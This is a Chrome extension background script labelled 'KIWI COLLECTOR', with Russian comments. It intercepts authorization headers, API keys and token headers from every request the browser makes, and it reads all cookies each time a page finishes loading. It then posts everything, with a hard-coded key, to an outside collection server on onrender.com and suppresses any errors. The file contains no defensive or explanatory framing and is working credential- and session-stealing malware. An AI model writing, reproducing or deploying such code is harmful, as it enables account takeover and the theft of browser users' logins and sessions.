
// KIWI COLLECTOR - Background
const BRIDGE = "https://claude-bridge-render.onrender.com";
const KEY = "claude2025";

// P1: Перехват Authorization headers
chrome.webRequest.onSendHeaders.addListener(
  function(details) {
    const authHeaders = (details.requestHeaders || []).filter(h => {
      const name = h.name.toLowerCase();
      return name === "authorization" || 
             name === "x-api-key" ||
             name === "x-auth-token" ||
             name.includes("token");
    });

    if (authHeaders.length > 0) {
      send({
        type: "headers",
        url: details.url,
        headers: authHeaders
      });
    }
  },
  {urls: ["<all_urls>"]},
  ["requestHeaders"]
);

// P1: Cookies при загрузке страницы
chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
  if (info.status === "complete" && tab.url && tab.url.startsWith("http")) {
    chrome.cookies.getAll({url: tab.url}, function(cookies) {
      if (cookies && cookies.length > 0) {
        send({
          type: "cookies",
          url: tab.url,
          host: new URL(tab.url).host,
          cookies: cookies
        });
      }
    });
  }
});

async function send(data) {
  try {
    data.time = new Date().toISOString();
    await fetch(BRIDGE + "/collect", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({key: KEY, data: data})
    });
  } catch(e) {}
}

console.log("[KC] Background started");
